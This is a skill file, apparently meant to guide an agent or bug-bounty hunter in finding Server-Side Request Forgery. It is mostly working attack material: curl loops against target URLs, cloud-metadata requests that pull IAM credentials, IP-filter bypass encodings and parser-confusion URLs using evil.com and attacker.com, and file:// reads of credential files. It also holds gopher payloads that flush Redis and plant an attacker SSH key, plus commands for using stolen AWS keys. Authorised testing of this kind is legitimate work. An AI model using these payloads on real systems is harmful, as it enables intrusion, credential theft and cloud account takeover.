---
name: ssrf
description: Hunt Server-Side Request Forgery (SSRF) — internal network access, cloud metadata exploitation, gopher/file/dict protocol abuse, and 11 IP-filter bypass techniques. Use when an endpoint accepts a URL, hostname, or file path as input.
metadata:
  type: skill
  phase: hunt
  vuln_class: ssrf
  cwe: 918
  tools: [SSRFmap, Gopherus, interactsh-client, ffuf]
---

# SSRF (Server-Side Request Forgery)

> 80% of bug bounty critical findings on cloud apps. Cloud metadata = jackpot.

## When to invoke

**Trigger phrases:**
- "test SSRF"
- "URL fetcher"
- "cloud metadata"
- "webhook tester"
- "image proxy"
- "PDF / screenshot generator"

## Why SSRF pays

SSRF lets you make the **server** send HTTP requests on your behalf. This means:
- Access cloud metadata endpoints (`169.254.169.254`) → IAM credentials → cloud takeover
- Reach internal services (`localhost:8080`, RDS, internal APIs)
- Read files via `file://`
- Port scan internal network
- Bypass IP whitelists (server's IP is whitelisted)

## SSRF target inputs (where to find them)

| Input type | Examples | Likely impact |
|---|---|---|
| URL fetcher | `?url=`, "import from URL" | High-Critical |
| Webhook tester | "test webhook" buttons | Critical |
| PDF/image generator | export-to-PDF, og-image gen | Critical |
| Screenshot service | "preview link" | Critical |
| Avatar/image upload-from-URL | `?image_url=` | High |
| RSS reader / OG-meta scraper | "import RSS feed" | High |
| SSO/OIDC discovery URL | `?issuer=` | High |
| File include via URL | rare in modern stacks | High |
| Server-side request via webhook | Slack, Discord integrations | High |
| GraphQL `@external` directives | rare | High |
| Open redirect chained → SSRF | many programs | Medium-High |

## Step-by-Step Workflow

### 1. Set up out-of-band listener

```bash
# interactsh-client (the standard)
interactsh-client -v

# Output:
# [INF] Listing 1 payload for OOB Testing
# c95i58q3...c95i58q3.oast.fun

# Now any DNS or HTTP request to *.c95i58q3...oast.fun gets logged
```

Alternative: Burp Collaborator (paid), or self-host with [interactsh server](https://github.com/projectdiscovery/interactsh).

### 2. Test for any SSRF (canary)

Send your interactsh URL to every URL-accepting parameter:

```bash
# Replace c95i58q3.oast.fun with your unique
INTERACT="c95i58q3.oast.fun"

# Common URL parameters
ENDPOINTS=(
    "https://target.com/api/import?url=http://${INTERACT}/"
    "https://target.com/webhook/test?endpoint=http://${INTERACT}/"
    "https://target.com/og-image?src=http://${INTERACT}/test.png"
    "https://target.com/avatar?url=http://${INTERACT}/avatar.jpg"
    "https://target.com/preview?url=http://${INTERACT}/"
)
for url in "${ENDPOINTS[@]}"; do
    curl -s "$url" > /dev/null
done

# Check interactsh log — if you see requests, SSRF confirmed
```

### 3. Test for cloud metadata

If basic SSRF works, escalate to cloud metadata:

```bash
# AWS metadata endpoint (IMDSv1)
?url=http://169.254.169.254/latest/meta-data/
?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>
# Returns: {"Code":"Success","AccessKeyId":"AKIA...","SecretAccessKey":"...","Token":"..."}

# AWS IMDSv2 (requires PUT for token first — most modern setups)
# Note: SSRF that allows only GET requests can't get IMDSv2 token easily
# Some apps proxy headers though → check if you can set custom headers

# GCP metadata
?url=http://metadata.google.internal/computeMetadata/v1/
# Requires Metadata-Flavor: Google header — SSRF must allow custom headers

# Azure IMDS
?url=http://169.254.169.254/metadata/instance?api-version=2021-02-01
# Requires Metadata: true header

# DigitalOcean
?url=http://169.254.169.254/metadata/v1/

# Alibaba
?url=http://100.100.100.200/latest/meta-data/

# Oracle Cloud
?url=http://192.0.0.192/latest/

# Internal Kubernetes
?url=http://kubernetes.default.svc/
?url=http://kubernetes.default.svc/api/v1/namespaces/default/pods
```

### 4. The 11 IP filter bypass techniques

When the app blocks `127.0.0.1`, `localhost`, `169.254.169.254`, try:

```
# 1. Decimal
http://2130706433/        ← 127.0.0.1
http://3232235521/        ← 192.168.0.1

# 2. Octal
http://0177.0.0.1/        ← 127.0.0.1
http://017700000001/

# 3. Hex
http://0x7f.0.0.1/        ← 127.0.0.1
http://0x7f000001/

# 4. Mixed
http://127.1/             ← shorthand
http://127.0.1/

# 5. IPv6 representation of IPv4
http://[::ffff:127.0.0.1]/
http://[0:0:0:0:0:ffff:7f00:1]/
http://[::ffff:7f00:1]/

# 6. URL-encoded
http://%31%32%37%2e%30%2e%30%2e%31/

# 7. Double URL-encoded
http://%2531%2532%2537%252e%2530%252e%2530%252e%2531/

# 8. DNS rebinding
# Use http://attacker.com that resolves to attacker IP first, then to 169.254.169.254
# Tool: https://github.com/nccgroup/singularity

# 9. Subdomain to attacker that returns A → internal IP
http://169-254-169-254.attacker.com/    ← if attacker controls DNS

# 10. URL parser confusion (different libs parse URLs differently)
http://evil.com#@127.0.0.1/
http://evil.com@127.0.0.1/
http://127.0.0.1#@evil.com/
http://127.0.0.1@evil.com/
http://evil.com\@127.0.0.1/
http://evil.com\\@127.0.0.1/
http://127.0.0.1.evil.com/
http://localhost.evil.com/

# 11. Localhost aliases
http://localhost/
http://0.0.0.0/
http://0/
http://[::]/
http://[0:0:0:0:0:0:0:0]/
```

See `arsenal/ssrf-payloads/ip-bypass-cheatsheet.md` for the full list.

### 5. Protocol smuggling

If `http://` blocked, try other schemes:

```
file:///etc/passwd
file:///etc/hostname
file:///proc/self/environ      ← env vars (incl. AWS keys sometimes!)
file:///proc/self/cmdline
file:///root/.aws/credentials
file://localhost/etc/passwd

gopher://127.0.0.1:6379/_FLUSHALL   ← Redis command injection
gopher://127.0.0.1:25/_HELO%20a%0aMAIL%20FROM   ← SMTP

dict://127.0.0.1:6379/info
ftp://127.0.0.1/

ldap://127.0.0.1/

# Schemes the lib might not block
jar://
netdoc://
mailto:
data:text/html,<script>alert(1)</script>   ← if rendered, XSS

# For Java apps
jar:http://attacker.com/!/
```

### 6. Gopher protocol → POST/Redis/SMTP attacks

```bash
# Generate gopher payload for Redis
# Tool: gopherus
gopherus --exploit redis
# Outputs ready-to-use gopher:// URL for Redis CRUD

# Example: write SSH key to authorized_keys via SSRF + gopher:Redis
gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$71%0d%0a%0a%0assh-rsa AAAA... attacker@kali%0a%0a%0d%0a*4%0d%0a...
```

### 7. SSRFmap (automation)

```bash
git clone https://github.com/swisskyrepo/SSRFmap
cd SSRFmap

# Create request.txt with SSRF parameter marked as SSRFmap target
# (use Burp to capture, mark the SSRF param value as `SSRFmap`)

python3 ssrfmap.py -r request.txt -p url -m readfiles
python3 ssrfmap.py -r request.txt -p url -m portscan
python3 ssrfmap.py -r request.txt -p url -m aws       # AWS metadata
python3 ssrfmap.py -r request.txt -p url -m redis     # gopher → Redis
python3 ssrfmap.py -r request.txt -p url -m smtp      # gopher → SMTP
python3 ssrfmap.py -r request.txt -p url -m dnsrebind
```

### 8. Blind SSRF detection

If no response is reflected, use OOB:

```bash
# Throw interactsh URL in every URL param, wait 5 minutes
# If you see DNS/HTTP hit in interactsh → blind SSRF

# Pivot to internal scanning via "blind"
# Use interactsh with subdomains per port:
http://port-80.c95i58q3.oast.fun → tells server to look up port-80.c95i58q3.oast.fun
                                  → if it includes a 1px image url, you know A was reachable
```

### 9. Webhook-style SSRF

Some apps let you set a webhook URL. They send POST on events:

```bash
# Set webhook URL to interactsh
# Trigger event → check interactsh
# If request comes from internal IP → SSRF

# Can sometimes inject Host header to reach another internal hostname
WEBHOOK=http://your-interactsh.oast.fun
# Some implementations attach extra paths or headers we control
```

## Cloud-specific exploitation

### AWS IMDS v1 → IAM credentials → full account takeover

```bash
# Get role name
?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Returns role name, e.g.: "EC2-prod-role"

# Get credentials
?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/EC2-prod-role

# Returns:
# {
#   "AccessKeyId": "ASIA...",
#   "SecretAccessKey": "...",
#   "Token": "...",
#   "Expiration": "..."
# }

# Use the credentials
export AWS_ACCESS_KEY_ID=ASIA...
export AWS_SECRET_ACCESS_KEY=...
export AWS_SESSION_TOKEN=...

aws sts get-caller-identity
aws s3 ls
aws iam list-users
# Now you've got full IAM access if role is over-privileged
```

### GCP metadata → service account token

```bash
?url=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
# Header required: Metadata-Flavor: Google
```

If SSRF allows custom headers (some do via different params):
```bash
# Some apps allow header injection
?url=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token&header=Metadata-Flavor:Google
```

### Azure IMDS → managed identity token

```bash
?url=http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
# Header required: Metadata: true
```

## Output template

```markdown
## Critical: SSRF in /api/v3/import/url leading to AWS IAM credential disclosure

### Summary
The `/api/v3/import/url` endpoint, designed to import a document from a remote URL, does not validate the URL host. By supplying the AWS metadata endpoint, an attacker can retrieve IAM credentials for the EC2 role attached to the application's hosts, leading to full AWS account access.

### Steps to reproduce
1. Log in to target.com (any user account)
2. Send the following request:
   ```http
   POST /api/v3/import/url HTTP/1.1
   Host: app.target.com
   Cookie: session=USER_SESSION
   Content-Type: application/json

   {"url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"}
   ```
3. The response body contains:
   ```
   web-prod-role
   ```
4. Now fetch credentials:
   ```http
   POST /api/v3/import/url HTTP/1.1
   ...
   {"url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/web-prod-role"}
   ```
5. Response includes:
   ```json
   {
     "AccessKeyId": "ASIA...",
     "SecretAccessKey": "...",
     "Token": "...",
     "Expiration": "2026-06-02T15:42:18Z"
   }
   ```
6. Verified the credentials via `aws sts get-caller-identity`:
   ```
   {
     "UserId": "AROA...",
     "Account": "123456789012",
     "Arn": "arn:aws:sts::123456789012:assumed-role/web-prod-role/..."
   }
   ```

### Impact
- Disclosure of IAM credentials for the production EC2 instance role
- IAM role `web-prod-role` has the following permissions (enumerated via `aws iam`):
  - Full read/write to S3 bucket `target-uploads`
  - SQS read on `target-jobs-queue`
  - RDS describe-instances
- Potential to read all uploaded files, including PII (user-submitted IDs)

### Suggested fix
1. Whitelist allowed URL hosts strictly
2. Block all RFC1918 ranges and 169.254.x.x at the URL fetcher level
3. Enforce IMDSv2 (token-based) on EC2 instances
4. Reduce IAM role permissions to least privilege
```

## Cross-references

- `[[content-discovery]]` — finds URL-accepting endpoints
- `[[js-analysis]]` — JS may reveal internal hostnames to target via SSRF
- `[[cloud-misconfig]]` — what to do with extracted cloud creds
- `[[oauth-oidc]]` — SSRF via OIDC discovery URL

## Common pitfalls

1. **Reporting SSRF that reaches `http://example.com` only.** Need internal reach OR cloud metadata for impact.
2. **Not testing both schemes and IP encodings.** WAFs block `127.0.0.1` but not `0x7f.0.0.1`.
3. **Missing IMDSv2 reality.** IMDSv1 is deprecated; IMDSv2 needs token endpoint → harder via SSRF.
4. **Blind SSRF without OOB confirmation.** Use interactsh, then prove via internal pivot.
5. **Reporting localhost SSRF without internal services found.** Need to demonstrate impact.

## Quick canary one-liner

```bash
INTERACT=$(interactsh-client -v 2>&1 | grep -oE '[a-z0-9]{32}\.oast\.fun' | head -1)
# Then throw $INTERACT in every URL param
```

## SSRF + open redirect chain

If straight SSRF blocked but open redirect works:
```
?url=https://target.com/redirect?to=http://169.254.169.254/
                                    ↑ server follows redirect → metadata
```

Many URL fetchers follow 30x responses → use open redirect to bypass host whitelisting.
